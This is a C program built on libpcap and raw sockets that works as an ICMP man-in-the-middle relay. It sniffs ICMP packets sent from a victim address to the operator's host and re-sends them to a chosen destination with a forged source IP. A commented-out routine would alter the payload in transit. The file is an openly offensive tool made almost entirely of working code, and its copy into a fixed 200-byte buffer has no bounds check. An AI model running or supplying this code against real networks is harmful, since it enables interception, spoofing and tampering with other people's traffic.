#include <pcap/pcap.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <errno.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>


in_addr_t ip_src;
in_addr_t ip_dst;
in_addr_t ip_me;


void flip(u_char * data, unsigned int datalen);

int mitm(in_addr_t src, in_addr_t dst, struct ip iph, struct icmphdr icmph, unsigned char * data, unsigned int datalen){
  int sock;
  unsigned char buf[200];
  unsigned int pack_len;
  struct ip * iphn = (struct ip *) buf;
  struct icmphdr * icmphn = (struct icmphdr *) (iphn + 1);
  unsigned char * dataptr = (unsigned char *) (icmphn + 1);
  int on, i;
  struct sockaddr_in dst_struct;

  on = 1;
  bzero(buf, sizeof(buf));
 
  /* Create RAW socket */
  if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0){
    perror("socket() error");
    exit(1);
  }
 
  /* socket options, tell the kernel we provide the IP structure */
  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
    perror("setsockopt() for IP_HDRINCL error");
    exit(1);
  }
  
  memcpy(iphn, &iph, sizeof(struct ip));   
  memcpy(icmphn, &icmph, sizeof(struct icmphdr));
  memcpy(dataptr, data, datalen);
  pack_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + datalen; 
  buf[pack_len] = '\0';
  
  iphn->ip_dst.s_addr = dst;
  iphn->ip_src.s_addr = src;
//  printf("Sending to %s from spoofed %s\n", inet_ntoa(iphn->ip_dst), inet_ntoa(iphn->ip_src));
  iphn->ip_len = htons(pack_len);
  iphn->ip_sum = 0;
  
  dst_struct.sin_addr = iphn->ip_dst;
  dst_struct.sin_family = AF_INET;
  
  for(i=0;i<pack_len;i++){
    fprintf(stderr, "<%d>", buf[i]);
  }
  fprintf(stderr, "\n");

  /* sending time */
  if(sendto(sock, buf, (size_t) pack_len, 0, (struct sockaddr *)&dst_struct, sizeof(dst_struct)) < 0){
    perror("sendto() error");
  } else{
    fprintf(stderr, "sendto() is OK.\n");
  }

  /* close */
  close(sock); 

}

void my_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
    packet) 
{  
    int i;
    fprintf(stderr, "Packet Captured, length %d\n", pkthdr->len);
   
    for(i = 0;i < pkthdr->len ;i++){
      fprintf(stderr, "<%d>", *(packet + i));
    }
    fprintf(stderr, "\n");
  
    struct ip * iph = (struct ip * ) (packet + 14);
    unsigned short ip_len = iph->ip_len;
    unsigned int icmp_offset = iph->ip_hl * 4;

    struct icmphdr * icmph = (struct icmphdr *) (packet + 14 + icmp_offset);    
    fprintf(stderr, "ICMP type : %d, ICMP seq : %d\n", (char) icmph->type, (short) icmph->un.echo.sequence);

    unsigned int datalen = pkthdr->len - 14 - icmp_offset - sizeof(struct icmphdr);
    unsigned int offset = 14 + icmp_offset + sizeof(struct icmphdr);
    fprintf(stderr, "data len %d, data offset %d\n", datalen, offset);
    
    u_char * buf = malloc(sizeof(u_char) * datalen);
    for(i = 0; i < datalen; i++){
      *(buf + i) = *(packet + offset + i);
    }
    
    for(i = 0;i < datalen ;i++){
      fprintf(stderr, "<%d>", *(buf + i));
    }
    fprintf(stderr, "\n");
   
//    flip(buf, datalen);
    
    mitm(ip_src, ip_dst, *iph, *icmph, buf, datalen);
}


void flip(u_char * c, unsigned int datalen){
    u_char * i;
    for(i = c;i < c + datalen; i++){
	*i = (*i) + 1;
    }
}

int main(int argc,char **argv) 
{ 
    int i;
    char *dev; 
    char errbuf[PCAP_ERRBUF_SIZE]; 
    pcap_t* descr; 
    const u_char *packet; 
    struct pcap_pkthdr hdr;
    struct ether_header *eptr;    /* net/ethernet.h */
    struct bpf_program fp;        /* hold compiled program */
    bpf_u_int32 maskp;            /* subnet mask */
    bpf_u_int32 netp;             /* ip */
 
    if(argc < 5){
       printf("Usage <interface> <ip source> <ip destination> <ip yourself>\n");
       exit(1);
    }
    /* input arguments */
    ip_src = inet_addr(argv[2]);
    ip_dst = inet_addr(argv[3]);
    ip_me = inet_addr(argv[4]);     
    dev = argv[1]; 
     
    /* Get the network address and mask */
    pcap_lookupnet(dev, &netp, &maskp, errbuf); 
 
    /* open device for reading in promiscuous mode */
    descr = pcap_open_live(dev, BUFSIZ, 1,-1, errbuf); 
    if(descr == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(1);
    } 
 
    /* Now we'll compile the filter expression*/
    char * filter_expr = malloc(100);
    // only capture the inbound packets
    // This is ugly but it is working.libpcap do not have inbound/outbound keyworkds
    // Only capture the traffic aiming at your ip as dst
    // and come remotely from the src you gave
    sprintf(filter_expr, "icmp and src net %s and dst net %s", argv[2], argv[4]);
    if(pcap_compile(descr, &fp, filter_expr, 0, netp) == -1) {
        fprintf(stderr, "Error calling pcap_compile\n");
        exit(1);
    } 
 
    /* set the filter */
    if(pcap_setfilter(descr, &fp) == -1) {
        fprintf(stderr, "Error setting filter\n");
        exit(1);
    } 
 
    /* loop for callback function */
    pcap_loop(descr, -1, my_callback, NULL); 
    return 0; 
}

